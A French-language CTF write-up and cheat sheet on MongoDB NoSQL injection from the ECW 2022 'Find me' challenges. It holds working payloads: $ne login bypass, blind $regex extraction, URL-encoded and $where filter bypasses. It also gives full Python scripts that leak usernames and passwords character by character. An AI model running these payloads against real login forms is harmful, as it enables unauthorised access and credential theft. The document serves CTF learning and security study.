# NoSQL Injection — MongoDB

> 📄 **Challenges réels : `Find me 1/2/3` — ECW 2022**

## Table des matières
- [Prérequis](#prérequis)
- [Concepts clés](#concepts-clés)
- [Méthodologie générale](#méthodologie-générale)
- [Technique 1 — Login Bypass avec $ne](#technique-1--login-bypass-avec-ne)
- [Technique 2 — Blind NoSQLi avec $regex](#technique-2--blind-nosqli-avec-regex)
- [Bypass de filtres](#bypass-de-filtres)
- [Erreurs fréquentes](#erreurs-fréquentes)
- [Résumé des opérateurs MongoDB](#résumé-des-opérateurs-mongodb)

---

## Prérequis

- Comprendre les bases de MongoDB (collections, documents, requêtes)
- Avoir `python3` + `requests` installés
- Comprendre ce qu'est une requête HTTP POST avec `application/x-www-form-urlencoded`

---

## Concepts clés

### Pourquoi MongoDB est vulnérable

MongoDB n'utilise pas SQL — ses requêtes sont des **objets JSON**. Quand un formulaire web envoie des paramètres directement dans la requête MongoDB sans les nettoyer, on peut injecter des **opérateurs MongoDB** à la place de simples valeurs.

### Requête vulnérable type

```javascript
// Code Node.js/PHP vulnérable
db.users.findOne({
    username: req.body.username,
    password: req.body.password
})
```

Si `username` et `password` sont passés tels quels depuis le formulaire, on peut substituer une valeur par un **objet opérateur** :

```
// Input normal
username=admin&password=secret

// Input injecté
username[$ne]=admin&password[$ne]=secret
```

Ce qui donne côté MongoDB :

```javascript
db.users.findOne({
    username: { $ne: "admin" },
    password: { $ne: "secret" }
})
```

`$ne` signifie "not equal" → retourne le premier utilisateur dont le username est différent de "admin" ET le password différent de "secret" → authentification réussie sans connaître les credentials.

### Différence avec le SQL

| SQL | MongoDB | Effet |
|:---|:---|:---|
| `OR 1=1` | `$ne: "valeur_impossible"` | Condition toujours vraie |
| `LIKE 'a%'` | `$regex: "^a"` | Commence par 'a' |
| `= 'valeur'` | `$eq: "valeur"` | Égal à |
| `!= 'valeur'` | `$ne: "valeur"` | Différent de |

---

## Méthodologie générale

```
1. Identifier le point d'injection
   → Tester username[$ne]=x → comportement différent ? → injection possible

2. Identifier ce qu'on peut extraire
   → Login bypass possible ?    → $ne
   → Données extractibles ?     → $regex (blind, caractère par caractère)

3. Identifier les comptes présents
   → Leak username avec $regex + ^ (ancre début de chaîne)

4. Extraire les mots de passe
   → Leak password avec $regex + ^ pour le compte cible

5. S'authentifier normalement
   → Utiliser les credentials récupérés pour accéder au compte
```

---

## Technique 1 — Login Bypass avec $ne

> 📄 **Challenge réel : `Find me 1` — ECW 2022**

### Principe

L'opérateur `$ne` (not equal) permet de formuler une condition toujours vraie en cherchant un document dont les champs sont **différents** de valeurs qui n'existent pas.

### Payload

```
username[$ne]=valeur_inexistante&password[$ne]=valeur_inexistante
```

### Exemple réel — Find me 1

```
username[$ne]=tiphergane&password[$ne]=miaou
```

MongoDB exécute :

```javascript
db.users.findOne({
    username: { $ne: "tiphergane" },
    password: { $ne: "miaou" }
})
```

→ Retourne le premier document dont le username n'est pas "tiphergane" et le password n'est pas "miaou" → authentification réussie → flag affiché.

```
Flag : ECW{M0ngoDb_iS_$upEr_EZ_2_XPloit}
```

### Test rapide en curl

```bash
# Tester le bypass
curl -X POST http://cible.fr/login.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username[$ne]=x&password[$ne]=x"
```

> ⚠️ **Le header `Content-Type: application/x-www-form-urlencoded`** est indispensable — sans lui, le serveur n'interprète pas `[$ne]` comme un opérateur MongoDB mais comme une chaîne littérale.

---

## Technique 2 — Blind NoSQLi avec $regex

> 📄 **Challenges réels : `Find me 2` et `Find me 3` — ECW 2022**

### Principe

L'opérateur `$regex` permet de tester si un champ **correspond à une expression régulière**. Combiné avec `^` (ancre début de chaîne), on peut deviner les valeurs caractère par caractère en observant si la page répond positivement ou non — exactement comme une Blind SQL boolean-based.

```
username[$regex]=^a.*  → vrai si le username commence par 'a'
username[$regex]=^ad.* → vrai si le username commence par 'ad'
```

### Étape 1 — Leak du username

```python
payload = f"username[$regex]=^{username}{c}.*&password[$ne]=miaou"
```

- `^{username}{c}.*` → le username commence par ce qu'on a déjà trouvé + le caractère testé
- `password[$ne]=miaou` → condition toujours vraie sur le password pour ne pas bloquer

Si la page retourne le flag → le caractère `c` est correct → on l'ajoute et on passe au suivant.

### Étape 2 — Leak du password

```python
payload = f"username[$ne]={username}&password[$regex]=^{password}{c}"
```

- `username[$ne]={username}` → cible un utilisateur différent de celui déjà connu (pour trouver le compte cible)
- `password[$regex]=^{password}{c}` → teste le password caractère par caractère

### Script complet — Find me 2

```python
#!/usr/bin/env python3
import requests
import string
import pwn

url     = "http://213.32.7.237:23062/login.php"
headers = {
    "User-agent": "Mozilla/5.0",
    "content-type": "application/x-www-form-urlencoded",
}
# Exclure les caractères spéciaux regex qui fausseraient l'injection
alphabet = [c for c in string.printable[:-6]
            if c not in ["*", "+", ".", "?", "|", "&", "$", "\\"]]

def leak_username():
    username = ""
    while True:
        found = False
        for c in alphabet:
            payload  = f"username[$regex]=^{username}{c}.*&password[$ne]=miaou"
            response = requests.post(url, data=payload, headers=headers)
            if "ECW" in response.text:
                username += c
                found = True
                print(f"\rUsername : {username}", end="")
                break
        if not found:
            break
    pwn.success(f"Username trouvé : {username}")
    return username

def leak_password(username):
    password = ""
    while True:
        found = False
        for c in alphabet:
            payload  = f"username[$ne]={username}&password[$regex]=^{password}{c}"
            response = requests.post(url, data=payload, headers=headers)
            if "ECW" in response.text:
                password += c
                found = True
                print(f"\rPassword : {password}", end="")
                break
        if not found:
            break
    pwn.success(f"Password trouvé : {password}")
    return password

username = leak_username()
password = leak_password("admin")  # cible le compte admin
```

### Script complet — Find me 3

Find me 3 ajoute une subtilité : le compte cible est **Vicktor Novalchik**, donc on démarre la recherche du username avec le préfixe `"v"` pour cibler directement son compte plutôt que de partir de zéro.

```python
#!/usr/bin/env python3
import requests
import string
import re
import pwn

url     = "http://213.32.7.237:23031/login.php"
headers = {
    "User-agent": "Mozilla/5.0",
    "content-type": "application/x-www-form-urlencoded",
}
alphabet = [c for c in string.printable[:-6]
            if c not in ["*", "+", ".", "?", "|", "&", "$", "\\"]]

def get_flag(source):
    """Extrait automatiquement le flag du HTML retourné"""
    flags = re.findall(r"ECW{.*?}", source)
    for flag in flags:
        pwn.success(f"Flag : {flag}")

def poc():
    """Vérifie que le bypass $ne fonctionne"""
    payload  = "username[$ne]=tiphergane&password[$ne]=miaou"
    response = requests.post(url, data=payload, headers=headers)
    if "ECW" in response.text:
        pwn.info("Bypass $ne confirmé")
        get_flag(response.text)

def leak_username(prefix="v"):
    """
    Leak du username en partant d'un préfixe connu.
    Ici "v" car le compte cible est Vicktor Novalchik.
    """
    username = prefix
    while True:
        found = False
        for c in alphabet:
            payload  = f"username[$regex]=^{username}{c}.*&password[$ne]=miaou"
            response = requests.post(url, data=payload, headers=headers)
            if "ECW" in response.text:
                username += c
                found = True
                print(f"\rUsername : {username}", end="")
                break
        if not found:
            break
    pwn.success(f"Username trouvé : {username}")
    return username

def leak_password(username):
    """Leak du password du compte cible"""
    password = ""
    while True:
        found = False
        for c in alphabet:
            payload  = f"username={username}&password[$regex]=^{password}{c}"
            response = requests.post(url, data=payload, headers=headers)
            if "ECW" in response.text:
                password += c
                found = True
                print(f"\rPassword : {password}", end="")
                break
        if not found:
            break
    pwn.success(f"Password trouvé : {password}")
    return password

def login(username, password):
    """Authentification normale avec les credentials récupérés"""
    payload  = f"username={username}&password={password}"
    response = requests.post(url, data=payload, headers=headers)
    if "ECW" in response.text:
        get_flag(response.text)

# Exploitation complète
poc()
target_user = leak_username("v")       # part de "v" → Vicktor
target_pass = leak_password(target_user)
login(target_user, target_pass)
```

### Pourquoi exclure certains caractères de l'alphabet ?

```python
if c not in ["*", "+", ".", "?", "|", "&", "$", "\\"]:
```

Ces caractères ont une **signification spéciale en regex** — les injecter dans `$regex` produirait des expressions invalides ou des faux positifs :

| Caractère | Signification regex | Problème |
|---|---|---|
| `*` | 0 ou plusieurs | `^a*` matche n'importe quoi |
| `+` | 1 ou plusieurs | `^a+` matche 'a', 'aa', etc. |
| `.` | n'importe quel caractère | `^a.` matche 'ab', 'ac', etc. |
| `?` | 0 ou 1 | ambiguïté |
| `\|` | OU | `^a\|b` matche 'a' OU 'b' |
| `$` | fin de chaîne | conflit avec les opérateurs MongoDB |
| `\\` | escape | casse l'expression |

---

## Bypass de filtres

### Si `[$ne]` est filtré — notation JSON

Certains serveurs acceptent du JSON en POST. On peut alors envoyer les opérateurs directement en JSON :

```bash
curl -X POST http://cible.fr/login.php \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": "x"}, "password": {"$ne": "x"}}'
```

### Si le `$` est filtré

```
# Encodage URL
username[%24ne]=x    (%24 = $)

# Double encodage
username[%2524ne]=x
```

### Si `$regex` est filtré

```
# Alternatives MongoDB
username[$where]=this.username.match(/^a/)   ← JavaScript dans la requête
username[$options]=i                          ← options regex (insensible casse)
```

---

## Erreurs fréquentes

### Le bypass ne fonctionne pas malgré le bon payload
→ Vérifier le `Content-Type` — il doit être `application/x-www-form-urlencoded` pour que `[$ne]` soit interprété comme un objet. Avec `text/plain`, c'est une chaîne littérale.

### Le leak username ne trouve rien
→ Vérifier que le caractère `^` n'est pas filtré. Tester `username[$regex]=^a` manuellement. Si bloqué, essayer `username[$where]=this.username.startsWith('a')`.

### Le leak s'arrête trop tôt
→ Le username/password contient peut-être un caractère exclu de l'alphabet (`.`, `$`, etc.). Les ajouter prudemment en les échappant : `\.` pour un point littéral dans le regex.

### Faux positifs dans le leak
→ Si plusieurs documents matchent le regex, la condition peut être vraie pour de mauvaises raisons. Affiner avec `username[$regex]=^{username}{c}$` (ancre fin de chaîne) quand on pense avoir trouvé la valeur complète.

---

## Résumé des opérateurs MongoDB

| Opérateur | Syntaxe form | Effet |
|:---|:---|:---|
| `$ne` | `champ[$ne]=val` | Différent de val |
| `$eq` | `champ[$eq]=val` | Égal à val |
| `$gt` | `champ[$gt]=val` | Supérieur à val |
| `$lt` | `champ[$lt]=val` | Inférieur à val |
| `$regex` | `champ[$regex]=^val.*` | Correspond au regex |
| `$exists` | `champ[$exists]=true` | Le champ existe |
| `$in` | `champ[$in][]=val` | Dans la liste |
| `$nin` | `champ[$nin][]=val` | Pas dans la liste |

---

*Technique : NoSQL Injection — MongoDB $ne bypass + $regex blind*
*Challenges réels : Find me 1/2/3 — ECW 2022*
